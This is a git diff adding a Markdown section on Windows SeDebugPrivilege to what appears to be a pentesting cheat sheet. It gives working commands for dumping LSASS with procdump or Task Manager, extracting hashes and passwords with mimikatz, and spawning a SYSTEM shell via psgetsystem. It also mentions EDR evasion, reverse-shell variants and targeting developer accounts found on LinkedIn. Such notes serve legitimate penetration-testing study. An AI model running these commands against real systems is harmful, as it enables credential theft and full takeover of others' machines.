@@ -847,3 +847,142 @@ nt authority\system
 ```
 
 ---
+
+# SeDebugPrivilege 
+
+## **What Is SeDebugPrivilege?**
+
+* A powerful Windows privilege that allows a user to **debug**, **inspect**, and **manipulate** any process on the system.
+* By default only **Administrators** have it.
+* Often assigned to **developers** or **support engineers** for debugging system components.
+* Dangerous: enables access to **sensitive memory**, **kernel structures**, and **SYSTEM processes**.
+
+## 🔥 **Why SeDebugPrivilege Matters for Attackers**
+
+* Allows reading and writing to *any* process memory, including:
+
+  * **LSASS.exe** → credentials
+  * **SYSTEM-owned processes**
+* Enables **Privilege Escalation → SYSTEM**
+* Enables **credential extraction** even without local admin rights.
+
+### 📍 **Where It’s Configured**
+
+`Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment → Debug programs`
+
+### 🕵️‍♂️ **Pentesting Tip**
+
+* During internal tests:
+  Target **developer accounts** found on LinkedIn — they often have SeDebugPrivilege.
+* A user may **not** be a local admin but still have SeDebugPrivilege.
+
+## 🔍 **Checking for SeDebugPrivilege**
+
+```cmd
+whoami /priv
+```
+
+Example output:
+
+```
+SeDebugPrivilege         Debug programs                   Disabled
+SeChangeNotifyPrivilege  Bypass traverse checking         Enabled
+```
+
+(“Disabled” just means not currently enabled in the token; it is still *held*.)
+
+
+## 🧪 **Using SeDebugPrivilege – Attacks**
+
+
+## **1. Dumping LSASS (Credential Theft)**
+
+### **Using Sysinternals ProcDump:**
+
+```cmd
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+This produces a full memory dump (lsass.dmp).
+
+### **Extracting Credentials with Mimikatz**
+
+```cmd
+mimikatz.exe
+mimikatz # log
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
+
+You can retrieve:
+
+* NTLM hashes
+* Kerberos tickets
+* Cleartext passwords (sometimes)
+
+Useful for:
+
+* **Pass-the-Hash**
+* **Lateral movement**
+
+## **2. Dump LSASS Without Tools (GUI method)**
+
+If RDP is available:
+
+* Open **Task Manager → Details → lsass.exe → Create dump file**
+* Download the dump → analyze with Mimikatz
+
+Useful when:
+
+* EDR blocks procdump
+* Uploading binaries is restricted
+
+## **3. Privilege Escalation → SYSTEM via SeDebugPrivilege**
+
+You can “steal” the token of a SYSTEM process by launching a child process through:
+
+* **Process injection**
+* **Token manipulation**
+
+### **Using PowerShell PoC (psgetsystem)**
+
+Syntax:
+
+```powershell
+[MyProcess]::CreateProcessFromParent(<SYSTEM_PID>, <command>, "")
+```
+
+Example:
+
+```powershell
+[MyProcess]::CreateProcessFromParent(612, "cmd.exe", "")
+```
+
+This launches **cmd.exe as SYSTEM**.
+
+To locate SYSTEM PIDs:
+
+```powershell
+tasklist
+# or
+Get-Process lsass
+```
+
+## ⚙️ **Alternate SeDebugPrivilege → SYSTEM Tools**
+
+* **psgetsystem** (decoder-it)
+* **SeDebugPrivilege exploitation PoCs**
+* Custom reverse shell variants
+
+These can be modified to:
+
+* return a reverse shell
+* add a user to Administrators
+* run arbitrary SYSTEM commands
+
+Useful when:
+
+* Only a web shell is available
+* GUI/RDP is not possible
+
+---
